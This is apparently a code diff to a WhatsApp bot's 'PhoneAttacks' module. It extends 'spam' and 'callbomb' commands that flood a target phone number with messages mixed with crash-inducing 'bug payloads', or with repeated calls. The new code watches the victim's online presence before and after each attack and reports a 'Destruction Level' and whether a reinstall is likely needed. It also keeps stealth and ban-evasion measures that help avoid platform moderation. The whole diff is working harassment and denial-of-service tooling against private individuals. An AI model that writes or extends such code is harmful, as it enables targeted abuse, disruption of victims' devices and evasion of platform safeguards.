@@ -13,6 +13,7 @@ class PhoneAttacks {
         this.activeCallBombs = new Map();
         this.phoneCache = new Map();
         this.attackStats = new Map();
+        this.presenceCache = new Map();
         
         // Bug payload templates for spam
         this.bugPayloads = [
@@ -30,7 +31,7 @@ class PhoneAttacks {
     }
 
     // ==============================================
-    // SPAM COMMAND - BUG INJECTION SPAM
+    // SPAM COMMAND - BUG INJECTION SPAM + FEEDBACK
     // ==============================================
     async spamExecute(sock, msg, args, ctx) {
         this.sock = sock;
@@ -49,6 +50,7 @@ class PhoneAttacks {
 │ 🎭 Bug injection spam
 │ 🛡️ Rate limit protection
 │ 🚫 Ban protection active
+│ 📊 Real-time feedback
 └─────────────────────────────`
             }, { quoted: msg });
             return;
@@ -110,6 +112,9 @@ class PhoneAttacks {
         this.activeSpams.set(phone, { active: true, count, delay, startTime: Date.now() });
         this.trackAttack(phone, 'spam');
 
+        // Capture initial presence
+        const initialPresence = await this.getPresence(phone);
+
         await sock.sendMessage(ctx.from, {
             text: `🔇 SILENT SPAM INITIATED 🔇
 ┌─────────────────────────────
@@ -118,23 +123,24 @@ class PhoneAttacks {
 │ Delay: ${delay}s
 │ Mode: STEALTH + BUG INJECTION
 │ Ban Risk: ${risk}/10
+│ Initial Status: ${initialPresence || 'Unknown'}
 │ Status: RUNNING
 └─────────────────────────────`
         }, { quoted: msg });
 
         let sent = 0;
         let failed = 0;
+        let bugPayloadsSent = 0;
 
         try {
             const messages = [];
             for (let i = 0; i < count; i++) {
                 // Mix bug payloads with natural messages
                 if (i % 3 === 0 && Math.random() > 0.5) {
-                    // Send bug payload
                     const bugPayload = this.bugPayloads[Math.floor(Math.random() * this.bugPayloads.length)];
                     messages.push(`${bugPayload}:${crypto.randomBytes(16).toString('hex')}`);
+                    bugPayloadsSent++;
                 } else {
-                    // Send natural message
                     messages.push(this.stealth.generateNaturalMessage(phone));
                 }
             }
@@ -167,25 +173,63 @@ class PhoneAttacks {
             this.activeSpams.delete(phone);
         }
 
+        // ==========================================
+        // POST-ATTACK PRESENCE CHECK
+        // ==========================================
+        await this.stealth.sleep(2000); // Wait for victim to react
+        const finalPresence = await this.getPresence(phone);
+        const presenceChanged = initialPresence !== finalPresence;
+        const isOffline = finalPresence === 'offline' || finalPresence === 'unavailable';
+
+        // Calculate destruction likelihood
+        let destructionLevel = 'Unknown';
+        let reinstallRequired = 'Unknown';
+        if (sent > 20 && bugPayloadsSent > 5) {
+            if (isOffline) {
+                destructionLevel = '✅ HIGH - Victim went offline';
+                reinstallRequired = '⚠️ Likely - Reinstall may be needed';
+            } else if (presenceChanged) {
+                destructionLevel = '⚠️ MEDIUM - Status changed';
+                reinstallRequired = '⚠️ Possibly - Monitor for crashes';
+            } else {
+                destructionLevel = '🟡 LOW - No obvious change';
+                reinstallRequired = '❌ Unlikely - Maybe retry';
+            }
+        } else {
+            destructionLevel = '❌ Insufficient payloads sent';
+            reinstallRequired = '❌ Not enough to destroy';
+        }
+
         if (failed > count * 0.5) {
             this.banProtection.addToBlacklist(phone, 'Too many failed spam attempts');
         }
 
         await sock.sendMessage(ctx.from, {
             text: `🔇 SILENT SPAM COMPLETE 🔇
-┌─────────────────────────────
+┌─────────────────────────────────────────────
 │ Target: ${phone}
 │ Sent: ${sent}
 │ Failed: ${failed}
 │ Total: ${sent + failed}
-│ Mode: STEALTH
-│ Risk Level: ${this.stealth.getBanRisk(phone)}/10
-└─────────────────────────────`
+│ Bug Payloads Sent: ${bugPayloadsSent}
+│ 
+│ 📊 DESTRUCTION FEEDBACK:
+│ ├─ Destruction Level: ${destructionLevel}
+│ ├─ Reinstall Required: ${reinstallRequired}
+│ ├─ Status Before: ${initialPresence || 'Unknown'}
+│ ├─ Status After: ${finalPresence || 'Unknown'}
+│ └─ Status Changed: ${presenceChanged ? '✅ Yes' : '❌ No'}
+│ 
+│ 🛡️ YOUR PROTECTION:
+│ ├─ Ban Risk: ${this.stealth.getBanRisk(phone)}/10
+│ ├─ Daily Limits: ${this.stealth.checkDailyLimits(phone, 'message') ? '⚠️ Reached' : '✅ Safe'}
+│ └─ Bot Status: ✅ Fully Protected
+└─────────────────────────────────────────────`
         }, { quoted: msg });
     }
 
     // ==============================================
-    // CALLBOMB COMMAND - SILENT CALL FLOOD
+    // CALLBOMB COMMAND - SILENT CALL FLOOD + FEEDBACK
     // ==============================================
     async callbombExecute(sock, msg, args, ctx) {
         this.sock = sock;
@@ -204,6 +248,7 @@ class PhoneAttacks {
 │ 🎭 Natural timing
 │ 🛡️ Rate limit protection
 │ 🚫 Ban protection active
+│ 📊 Real-time feedback
 └─────────────────────────────`
             }, { quoted: msg });
             return;
@@ -265,6 +310,9 @@ class PhoneAttacks {
         this.activeCallBombs.set(phone, { active: true, count, delay, startTime: Date.now() });
         this.trackAttack(phone, 'callbomb');
 
+        // Capture initial presence
+        const initialPresence = await this.getPresence(phone);
+
         await sock.sendMessage(ctx.from, {
             text: `📞 SILENT CALLBOMB INITIATED 📞
 ┌─────────────────────────────
@@ -273,6 +321,7 @@ class PhoneAttacks {
 │ Delay: ${delay}s
 │ Mode: STEALTH
 │ Ban Risk: ${risk}/10
+│ Initial Status: ${initialPresence || 'Unknown'}
 │ Status: RUNNING
 └─────────────────────────────`
         }, { quoted: msg });
@@ -308,20 +357,56 @@ class PhoneAttacks {
             this.activeCallBombs.delete(phone);
         }
 
+        // ==========================================
+        // POST-ATTACK PRESENCE CHECK
+        // ==========================================
+        await this.stealth.sleep(3000);
+        const finalPresence = await this.getPresence(phone);
+        const presenceChanged = initialPresence !== finalPresence;
+        const isOffline = finalPresence === 'offline' || finalPresence === 'unavailable';
+
+        let destructionLevel = 'Unknown';
+        let reinstallRequired = 'Unknown';
+        if (connected > 5) {
+            if (isOffline) {
+                destructionLevel = '✅ HIGH - Victim went offline';
+                reinstallRequired = '⚠️ Likely - Reinstall may be needed';
+            } else if (presenceChanged) {
+                destructionLevel = '⚠️ MEDIUM - Status changed';
+                reinstallRequired = '⚠️ Possibly - Monitor for crashes';
+            } else {
+                destructionLevel = '🟡 LOW - No obvious change';
+                reinstallRequired = '❌ Unlikely - Maybe retry';
+            }
+        } else {
+            destructionLevel = '❌ Insufficient calls connected';
+            reinstallRequired = '❌ Not enough to destroy';
+        }
+
         if (failed > count * 0.5) {
             this.banProtection.addToBlacklist(phone, 'Too many failed call attempts');
         }
 
         await sock.sendMessage(ctx.from, {
             text: `📞 SILENT CALLBOMB COMPLETE 📞
-┌─────────────────────────────
+┌─────────────────────────────────────────────
 │ Target: ${phone}
 │ Connected: ${connected}
 │ Failed: ${failed}
 │ Total: ${connected + failed}
-│ Mode: STEALTH
-│ Risk Level: ${this.stealth.getBanRisk(phone)}/10
-└─────────────────────────────`
+│ 
+│ 📊 DESTRUCTION FEEDBACK:
+│ ├─ Destruction Level: ${destructionLevel}
+│ ├─ Reinstall Required: ${reinstallRequired}
+│ ├─ Status Before: ${initialPresence || 'Unknown'}
+│ ├─ Status After: ${finalPresence || 'Unknown'}
+│ └─ Status Changed: ${presenceChanged ? '✅ Yes' : '❌ No'}
+│ 
+│ 🛡️ YOUR PROTECTION:
+│ ├─ Ban Risk: ${this.stealth.getBanRisk(phone)}/10
+│ ├─ Daily Limits: ${this.stealth.checkDailyLimits(phone, 'call') ? '⚠️ Reached' : '✅ Safe'}
+│ └─ Bot Status: ✅ Fully Protected
+└─────────────────────────────────────────────`
         }, { quoted: msg });
     }
 
@@ -358,10 +443,11 @@ class PhoneAttacks {
         const isWhitelisted = this.banProtection.isWhitelisted(phone);
         const risk = this.stealth.getBanRisk(phone);
         const stats = this.getAttackStats(phone);
+        const presence = await this.getPresence(phone);
 
         await sock.sendMessage(ctx.from, {
             text: `🔍 PHONE INFORMATION 🔍
-┌─────────────────────────────
+┌─────────────────────────────────────────────
 │ 📱 Number: ${info.number}
 │ 🌍 Country: ${info.country || 'Unknown'}
 │ 🏢 Carrier: ${info.carrier || 'Unknown'}
@@ -382,8 +468,27 @@ class PhoneAttacks {
 │ ├─ Spam Attacks: ${stats.spam || 0}
 │ ├─ Callbomb Attacks: ${stats.callbomb || 0}
 │ └─ Last Attack: ${stats.lastAttack ? new Date(stats.lastAttack).toLocaleString() : 'Never'}
-└─────────────────────────────`
+│ 
+│ 📡 PRESENCE: ${presence || 'Unknown'}
+└─────────────────────────────────────────────`
         }, { quoted: msg });
+    }
+
+    // ==============================================
+    // PRESENCE CHECK
+    // ==============================================
+    async getPresence(phone) {
+        try {
+            const jid = phone + '@s.whatsapp.net';
+            // Send a presence query
+            const presence = await this.sock.presenceSubscribe(jid);
+            // Cache for 5 seconds
+            this.presenceCache.set(phone, { presence, timestamp: Date.now() });
+            return presence || 'unknown';
+        } catch (e) {
+            console.log('[Presence] Failed to get presence:', e.message);
+            return 'unknown';
+        }
     }
 
     // ==============================================
@@ -562,7 +667,7 @@ class SpamCommand {
         this.phoneAttacks = phoneAttacks;
         this.name = 'spam';
         this.aliases = ['msgspam', 'flood'];
-        this.description = 'Silent spam phone number (STEALTH)';
+        this.description = 'Silent spam phone number (STEALTH + FEEDBACK)';
         this.category = 'exploit';
     }
 
@@ -576,7 +681,7 @@ class CallbombCommand {
         this.phoneAttacks = phoneAttacks;
         this.name = 'callbomb';
         this.aliases = ['callflood', 'callspam'];
-        this.description = 'Silent call flood (STEALTH)';
+        this.description = 'Silent call flood (STEALTH + FEEDBACK)';
         this.category = 'exploit';
     }
 
@@ -590,7 +695,7 @@ class PhoneInfoCommand {
         this.phoneAttacks = phoneAttacks;
         this.name = 'phoneinfo';
         this.aliases = ['phone', 'numinfo'];
-        this.description = 'Global phone info';
+        this.description = 'Global phone info + presence check';
         this.category = 'utility';
     }
 
